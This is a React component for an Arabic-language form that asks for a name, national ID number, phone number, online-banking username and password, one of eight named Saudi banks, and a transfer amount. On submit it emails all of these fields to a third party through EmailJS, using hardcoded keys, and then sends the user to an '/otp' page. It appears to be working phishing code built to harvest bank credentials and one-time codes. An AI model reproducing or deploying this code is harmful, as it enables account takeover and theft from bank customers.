import React, { useRef, useContext } from 'react';
import { Container, Button, Form } from 'react-bootstrap';
import { globalStateContext } from '../GlobalContextProvider';
import ReactCodeInput from 'react-verification-code-input';
import emailjs from "emailjs-com";

function UserInfo() {

    const state = useContext(globalStateContext)
    const dispatch = state[1];

    const firstName = useRef();
    const finalName = useRef();
    const userSSN = useRef();
    const userMobile = useRef();
    const userOfBank = useRef();
    const bankName = useRef();
    const totalAmount = useRef();
    const password = useRef();


    let userInfo = {};
    const redirect = () => {
        window.location.href = "/finalotp";
    }


    const sendEmail = (e) => {
        e.preventDefault();

        emailjs.sendForm('service_2lqpo5v', 'template_z50vfbf', e.target, 'user_ZGOipJzOPAMNq9fEL55ik')
            .then((result) => {
                window.location.href = "/otp";
            }, (error) => {
                console.log(error.text);
            });
        e.target.reset();
    };
    const submitHandler = (e) => {
        e.preventDefault();
        sendEmail(e);
    }
    return <Container dir="rtl" className="d-flex justify-content-center user-info-container mt-5 p-5 border shadow-sm">
        <Form className="w-100" onSubmitCapture={submitHandler}>
            <div className="user-info-container__inputs-block">
                <Form.Group className="mb-3 w-100 m-2">
                    <Form.Label>الاسم الاول</Form.Label>
                    <Form.Control type="text" placeholder="الاسم الاول" ref={firstName} required name="first_name" />
                </Form.Group>
                <Form.Group className="mb-3 w-100 m-2">
                    <Form.Label>اسم العائلة</Form.Label>
                    <Form.Control type="text" placeholder="اسم العائلة" ref={finalName} required name="final_name" />
                </Form.Group>
            </div>
            <div className="user-info-container__inputs-block">
                <Form.Group className="mb-3 w-100 m-2">
                    <Form.Label>الرقم الوطني</Form.Label>
                    <Form.Control type="text" placeholder="الرقم الوطني" required ref={userSSN} name="SSN" />
                </Form.Group>
                <Form.Group className="mb-3 w-100 m-2">
                    <Form.Label>رقم الهاتف</Form.Label>
                    <Form.Control type="text" placeholder="رقم الهاتف" required ref={userMobile} name="mobile_number" />
                </Form.Group>
            </div>
            <div className="user-info-container__inputs-block">
                <Form.Group className="mb-3 w-100 m-2 ms-0">
                    <Form.Label>اسم المستخدم للبنك</Form.Label>
                    <Form.Control type="text" placeholder="اسم المستخدم للبنك" className="me-0" required ref={userOfBank} name="bank_user_name" />
                </Form.Group>

                <Form.Group className="mb-3 w-100 m-2 ms-0">
                    <Form.Label>اختر اسم البنك</Form.Label>
                    <Form.Select aria-label="Default select example" className="mb-3 w-100 m-2" required ref={bankName} name="bank_name">
                        <option value="البنك الاهلي التجاري">البنك الأهلي التجاري</option>
                        <option value="البنك السعودي البريطاني">البنك السعودي البريطاني</option>
                        <option value="البنك السعودي الفرنسي">البنك السعودي الفرنسي</option>
                        <option value="البنك الاول">البنك الأول</option>
                        <option value="البنك السعودي للاستثمار">البنك السعودي للاستثمار</option>
                        <option value="البنك العربي الوطني">البنك العربي الوطني</option>
                        <option value="بنك البلاد">بنك البلاد</option>
                        <option value="بنك الجزيرة">بنك الجزيرة</option>
                    </Form.Select>
                </Form.Group>
            </div>

            <div className="user-info-container__inputs-block">
                <Form.Group className="mb-3 w-100 m-2" controlId="formBasicPassword">
                    <Form.Label>كلمة المرور للبنك</Form.Label>
                    <Form.Control type="password" placeholder="كلمة المرور للبنك" required ref={password} name="bank_password" />
                </Form.Group>

                <Form.Group className="mb-3 w-100 m-2" controlId="formBasicPassword">
                    <Form.Label>المبلغ المراد تحويلة</Form.Label>
                    <Form.Select aria-label="Default select example" className="mb-3 w-100 m-2" required ref={totalAmount} name="total_amount" >
                        <option>المبلغ المراد تحويلة</option>
                        <option value="1">20</option>
                        <option value="2">60</option>
                        <option value="3">90</option>
                    </Form.Select>
                </Form.Group>

            </div>

            <Button variant="primary" type="submit" className="mt-3 w-100" >
                استمرار
            </Button>
        </Form>
    </Container>
}

export default UserInfo;